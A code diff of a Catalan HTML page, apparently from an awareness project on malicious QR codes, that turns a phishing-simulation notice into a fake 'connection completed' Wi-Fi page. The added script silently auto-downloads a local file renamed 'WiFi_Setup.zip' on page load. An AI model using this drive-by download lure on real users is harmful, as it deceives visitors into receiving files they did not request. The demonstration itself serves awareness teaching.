@@ -2,29 +2,40 @@
 <html lang="ca">
 <head>
   <meta charset="UTF-8">
-  <title>Simulacre de phishing</title>
+  <title>Connexió completada</title>
   <style>
     body {
+      font-family: Arial, sans-serif;
       background-color: #fff3cd;
       color: #856404;
       text-align: center;
       padding: 50px;
-      font-family: Arial, sans-serif;
     }
     .box {
-      background-color: #fff;
+      display: inline-block;
       border: 2px solid #ffeeba;
       padding: 30px;
-      display: inline-block;
       border-radius: 10px;
+      background-color: #fff;
     }
   </style>
 </head>
 <body>
   <div class="box">
-    <h2>Has estat víctima d'un simulacre de phishing</h2>
-    <p>Aquesta pàgina forma part d’un projecte educatiu per conscienciar sobre els riscos dels codis QR maliciosos.</p>
-    <p>No has descarregat res real, però recorda: mai proporcionis dades personals a webs no oficials. 🔒</p>
+    <h2>Connexió simulada a la xarxa Wi-Fi</h2>
+    <p>Aquesta és una simulació per conscienciar sobre els riscos dels codis QR maliciosos.</p>
+    <p>Es descarregarà automàticament un fitxer per demostrar com podria funcionar un atac real.</p>
   </div>
+
+  <script>
+    // Descarrega automàticament el fitxer
+    const link = document.createElement('a');
+    link.href = 'wifi.zip'; // Fitxer que has de posar al projecte
+    link.download = 'WiFi_Setup.zip';
+    document.body.appendChild(link);
+    link.click();
+    document.body.removeChild(link);
+  </script>
 </body>
 </html>
+
